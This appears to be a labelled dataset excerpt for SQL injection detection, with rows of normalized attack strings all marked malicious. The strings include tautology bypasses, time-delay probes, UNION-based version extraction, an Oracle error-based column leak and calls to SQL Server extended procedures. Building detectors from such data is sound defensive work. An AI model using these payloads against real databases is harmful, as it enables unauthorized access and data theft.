row_index,payload_norm,label,sqli_type_hint
150,like,1,
151,or username like char ( 37 ) ;,1,
152,) ) or pg_sleep ( __TIME__ ) --,1,
153,select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1,
154,or 3 = 3,1,
155,"select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",1,
156,select * from users where id = 1 or ( $+ ) = 1 or 1 = 1 -- 1,1,
157,exec sp,1,
158,"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",1,
159,select * from users where id = 1 or \<$ or 1 = 1 -- 1,1,
160,"select * from users where id = 1.&&1 union select 1,version ( ) -- 1",1,
161,admin' or 1 = 1/*,1,
162,a' waitfor delay '0:0:10'--,1,
163,"select * from users where id = 1 + ( \ ) union select null,@@VERSION -- 1",1,
164,"select * from users where id = 1 union select .1$_,version ( ) -- 1",1,
165,and 1 in ( select var from temp ) --,1,
166,hi' ) or ( 'a' = 'a,1,
167,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",1,
168,"admin"" or 1 = 1",1,
169,""" ) or true--",1,
170,"select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",1,
171,"select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",1,
172,1 ) or pg_sleep ( __TIME__ ) --,1,
173,"select * from users where id = 1 or ""{."" or 1 = 1 -- 1",1,
174,""" ) or sleep ( __TIME__ ) = """,1,
175,select * from users where id = 1.<@. or 1 = 1 -- 1,1,
176,"admin"" ) or ( ""1"" = ""1""--",1,
177,"select * from users where id = 1<@.. union select 1,version ( ) -- 1",1,
178,; exec xp_regread,1,
179,"select * from users where id = '1' + @ 1 union select 1,version ( ) -- 1'",1,
